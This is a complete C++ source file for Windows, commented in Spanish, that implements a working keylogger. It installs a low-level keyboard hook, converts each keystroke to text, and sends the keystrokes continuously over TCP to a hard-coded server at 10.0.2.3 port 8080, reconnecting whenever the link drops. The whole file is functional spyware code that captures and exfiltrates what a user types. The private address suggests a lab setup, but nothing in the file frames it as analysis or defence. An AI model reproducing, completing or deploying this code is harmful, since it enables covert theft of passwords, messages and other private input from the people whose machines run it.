#include <iostream>
#include <vector>
#include <string>
#include <queue>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

// --- Configuración ---
const char* SERVER_IP   = "10.0.2.3";
const char* SERVER_PORT = "8080";

// --- Sincronización Global ---
std::queue<std::string> dataQueue;
std::mutex queueMtx;
std::condition_variable queueCv;
bool running = true;
HHOOK g_hook = nullptr;

// --- Traducción de Teclas a Texto Legible ---
std::string TranslateKey(DWORD vkCode, UINT scanCode) {
    static BYTE kbdState[256];
    GetKeyboardState(kbdState);

    // Actualizar estado de teclas especiales manualmente para el hilo
    kbdState[VK_SHIFT] = (GetKeyState(VK_SHIFT) & 0x80) ? 0x80 : 0;
    kbdState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x01) ? 0x01 : 0;
    kbdState[VK_MENU] = (GetKeyState(VK_MENU) & 0x80) ? 0x80 : 0;

    wchar_t buffer[5];
    HKL layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
    
    int result = ToUnicodeEx(vkCode, scanCode, kbdState, buffer, 4, 0, layout);

    if (result > 0) {
        std::wstring ws(buffer, result);
        return std::string(ws.begin(), ws.end());
    } else if (vkCode == VK_RETURN) return "\n";
    else if (vkCode == VK_BACK) return "[BACKSPACE]";
    else if (vkCode == VK_SPACE) return " ";
    else if (vkCode == VK_TAB) return "[TAB]";
    
    return ""; // Ignorar teclas sin representación de texto (F1, Ctrl, etc.)
}

// --- Lógica de Red (Consumidor) ---
void networkWorker() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;

    while (running) {
        struct addrinfo hints{}, *res = nullptr;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        if (getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &res) != 0) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (sock == INVALID_SOCKET) {
            freeaddrinfo(res);
            std::this_thread::sleep_for(std::chrono::seconds(2));
            continue;
        }

        if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
            closesocket(sock);
            freeaddrinfo(res);
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        freeaddrinfo(res);

        while (running) {
            std::string data;
            {
                std::unique_lock<std::mutex> lock(queueMtx);
                queueCv.wait_for(lock, std::chrono::milliseconds(500), [] { 
                    return !dataQueue.empty() || !running; 
                });

                if (!running && dataQueue.empty()) break;
                if (dataQueue.empty()) continue;

                data = dataQueue.front();
                dataQueue.pop();
            }

            if (send(sock, data.c_str(), (int)data.length(), 0) == SOCKET_ERROR) {
                break; // Error de conexión, intentar reconectar
            }
        }
        closesocket(sock);
    }
    WSACleanup();
}

// --- Hook de Teclado (Productor) ---
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
        
        std::string keyStroke = TranslateKey(kbs->vkCode, kbs->scanCode);
        
        if (!keyStroke.empty()) {
            std::lock_guard<std::mutex> lock(queueMtx);
            dataQueue.push(keyStroke);
            queueCv.notify_one();
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

// --- Entrada Principal ---
int main() {
    // 1. Iniciar hilo de red
    std::thread netThread(networkWorker);

    // 2. Instalar Hook
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!g_hook) {
        running = false;
        queueCv.notify_all();
        netThread.join();
        return 1;
    }

    std::cout << "Captura optimizada iniciada. Enviando a " << SERVER_IP << ":" << SERVER_PORT << std::endl;

    // 3. Loop de mensajes (Requerido para Hooks)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 4. Limpieza ordenada
    running = false;
    queueCv.notify_all();
    UnhookWindowsHookEx(g_hook);
    if (netThread.joinable()) netThread.join();

    return 0;
}
